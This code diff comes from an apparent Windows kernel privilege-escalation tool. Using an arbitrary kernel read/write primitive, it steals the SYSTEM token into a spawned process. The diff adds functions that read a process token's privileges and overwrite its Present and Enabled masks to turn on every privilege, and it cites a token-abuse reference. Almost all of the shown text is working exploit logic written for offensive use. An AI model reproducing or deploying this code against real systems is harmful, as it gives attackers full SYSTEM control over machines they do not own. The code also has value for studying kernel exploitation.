@@ -223,7 +223,6 @@ void TransferToken(CLIENT_ID Src, CLIENT_ID Dst) {
 	DstTokenObj.Value = systemtoken.Value;
 	WriteBySize(8, DestinationTokenAddress, &DstTokenObj);
 	std::cout << "[#]Finished -> who are you now?" << std::endl;
-
 }
 
 
@@ -290,6 +289,35 @@ DWORD64 RetriveEprocessHandleTable(CLIENT_ID procid) {
 	return ReadDWORD64(targetProc + Offsets.ObjectTable);
 }
 
+
+SEP_TOKEN_PRIVILEGES RetriveTokenPrivFromPID(int PID)
+{
+	auto Dst = CLIENT_ID{ (HANDLE)PID, nullptr };
+	DWORD64 DestinationTokenAddress = RetriveTokenAdress(Dst);
+
+	EX_FAST_REF DstTokenObj;
+	for (int i = 0; i < 8; i++) ((PCHAR)&DstTokenObj)[i] = ReadBYTE(DestinationTokenAddress + i);
+
+	_TOKEN tokenObject;
+	for (int i = 0; i < sizeof(tokenObject); i++) ((PCHAR)&tokenObject)[i] = ReadBYTE((size_t(DstTokenObj.Object) & 0xfffffffffffffff0) + i);
+	return tokenObject.Privileges;
+}
+
+void EnableAllPriv(int PID) {
+	//https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#2.-modifying-token-privileges
+	DWORD64 DestinationTokenAddress = RetriveTokenAdress(CLIENT_ID{ (HANDLE)PID, nullptr });
+
+	EX_FAST_REF DstTokenObj;
+	for (int i = 0; i < 8; i++) ((PCHAR)&DstTokenObj)[i] = ReadBYTE(DestinationTokenAddress + i);
+
+	_TOKEN tokenObject;
+	for (int i = 0; i < sizeof(tokenObject); i++) ((PCHAR)&tokenObject)[i] = ReadBYTE((size_t(DstTokenObj.Object) & 0xfffffffffffffff0) + i);
+
+	tokenObject.Privileges.Enabled = 0x0000001ff2ffffbc;
+	tokenObject.Privileges.Present = 0x0000001ff2ffffbc;
+	WriteBySize(sizeof(tokenObject), (size_t)DstTokenObj.Object & 0xfffffffffffffff0, &tokenObject);
+}
+
 int main() {
 
 	systemEprocessAddr = PsInitialSystemProcess();
@@ -320,5 +348,8 @@ int main() {
 	//ChangeMyPid(CLIENT_ID{ (HANDLE)GetCurrentProcessId(), nullptr }, 0);
 
 	TransferToken(CLIENT_ID{ (HANDLE)4, nullptr }, CLIENT_ID{ (HANDLE)pi.dwProcessId, nullptr });
+	//EnableAllPriv(pi.dwProcessId);
+	std::cout << "[#]Finished -> who are you now?" << std::endl;
+
 	Sleep(-1);
 }
